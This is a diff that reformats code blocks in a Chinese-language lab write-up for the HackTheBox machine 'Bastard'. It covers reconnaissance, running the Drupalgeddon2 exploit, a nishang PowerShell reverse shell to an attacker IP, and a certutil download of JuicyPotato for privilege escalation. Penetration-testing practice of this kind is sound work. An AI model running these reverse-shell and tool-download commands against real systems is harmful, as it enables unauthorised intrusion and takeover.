@@ -14,7 +14,7 @@ tags:
 
 ### nmap 端口扫描
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
 └─$ sudo nmap --min-rate 10000 -p- 10.129.6.171 -oA nmap/ports
 [sudo] password for kali: 
@@ -32,7 +32,7 @@ Nmap done: 1 IP address (1 host up) scanned in 15.57 seconds
 
 ### nmap 详细信息扫描
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
 └─$ sudo nmap -sT -sC -sV -O -p80,135,49154 10.129.6.171 -oA nmap/detail 
 [sudo] password for kali: 
@@ -71,7 +71,7 @@ Nmap done: 1 IP address (1 host up) scanned in 76.10 seconds
 > Drupal 是一个开源的内容管理系统，由 PHP 编写，主要用于构建和管理复杂网站
 ### nmap udp 扫描
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
 └─$ sudo nmap -sU -Pn --top-ports 20 10.129.6.171 -oA nmap/udp   
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-28 08:21 EST
@@ -106,7 +106,7 @@ Nmap done: 1 IP address (1 host up) scanned in 5.16 seconds
 没有明确开放的状态，攻击面基本为零，可以后续按需再深入扫描。
 ### nmap 漏洞脚本扫描
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
 └─$ sudo nmap --script=vuln -p80,135,49154 10.129.6.171 -oA nmap/vuln
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-28 08:22 EST
@@ -169,7 +169,7 @@ Nmap done: 1 IP address (1 host up) scanned in 6080.55 seconds
 
 通过 whatweb 可以进一步查看到 Drupal 的信息，进一步交叉验证系统和应用的情况。
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
 └─$ whatweb 10.129.6.171                                                
 http://10.129.6.171 [200 OK] Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Microsoft-IIS/7.5], IP[10.129.6.171], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], Microsoft-IIS[7.5], PHP[5.3.28,], PasswordField[pass], Script[text/javascript], Title[Welcome to Bastard | Bastard], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.3.28, ASP.NET]
@@ -178,7 +178,7 @@ http://10.129.6.171 [200 OK] Content-Language[en], Country[RESERVED][ZZ], Drupal
 
 根据 nmap 的扫描结果添加 hosts 记录：
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
 └─$ sudo bash -c 'echo "10.129.6.171 drupal.htb" >> /etc/hosts'
 [sudo] password for kali: 
@@ -194,7 +194,7 @@ http://10.129.6.171 [200 OK] Content-Language[en], Country[RESERVED][ZZ], Drupal
 
 对于这种大型的内容管理系统，先寻找是否由公开的漏洞利用，首先需要确定 Drupal 的版本、搜寻 Drupal 的默认密码尝试进行登入。在 Drupal 的源码中未发现具体的版本信息，使用弱密码也未能登入成功，访问前面 nmap 扫描暴露出的 robots.txt。
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
 └─$ curl -v http://drupal.htb/robots.txt
 * Host drupal.htb:80 was resolved.
@@ -314,7 +314,7 @@ Disallow: /?q=user/logout/
 
 发现有 CHANGELOG.txt 文件，访问得到 Drupal 的具体版本为 7.54。
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
 └─$ curl -v http://drupal.htb/CHANGELOG.txt | head -n 20
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -372,7 +372,7 @@ curl: (23) Failure writing output to destination, passed 2668 returned 439
 
 使用 searchsploit 寻找 Drupal 7.5.4 的公开漏洞。
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
 └─$ searchsploit Drupal 7.5                                             
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -407,7 +407,7 @@ Drupalgeddon 的适配版本不在范围中，可尝试的为 Drupalgeddon2 与 
 
 下载 searchsploit 检索到的 drupalgeddon2 利用。
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
 └─$ searchsploit -m 44449  
   Exploit: Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution
@@ -427,7 +427,7 @@ Copied to: /home/kali/Work/Kali/44449.rb
 
 按照使用说明利用获得初始用户与第一个 flag。
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
 └─$ ruby 44449.rb 
 Usage: ruby drupalggedon2.rb <target> [--authentication] [--verbose]
@@ -531,7 +531,7 @@ d89b289c7eff24c7b2de8cea489cf1e4
 
 将 nishang 的 Invoke-PowerShellTcp.ps1复制到工作目录下，编辑脚本在尾部追加 `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.46 -Port 443`
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Work]
 └─$ nishang 
 
@@ -563,7 +563,7 @@ d89b289c7eff24c7b2de8cea489cf1e4
 44449.rb  Invoke-PowerShellTcp.ps1  nmap
 ```
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
 └─$ echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.46 -Port 443' >> Invoke-PowerShellTcp.ps1 
                                                                                                                                                                                                                                                              
@@ -580,7 +580,7 @@ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.46 -Port 443
 
 靶机的操作系统为小于 Windows Server 2019，且开启了 SeImpersonate。可以使用 juicy-potato 提权。
 
-```
+```bash
 PS C:\inetpub\drupal-7.54>whoami /priv
 
 PRIVILEGES INFORMATION
@@ -595,7 +595,7 @@ SeCreateGlobalPrivilege Create global objects                     Enabled
 
 将 juicy-potato 与 nc64 下载至靶机，按照提示运行获得 root。
 
-```
+```bash
 PS C:\inetpub\drupal-7.54> 
 PS C:\inetpub\drupal-7.54> certutil.exe -urlcache -split -f http://10.10.16.46/JuicyPotato.exe
 
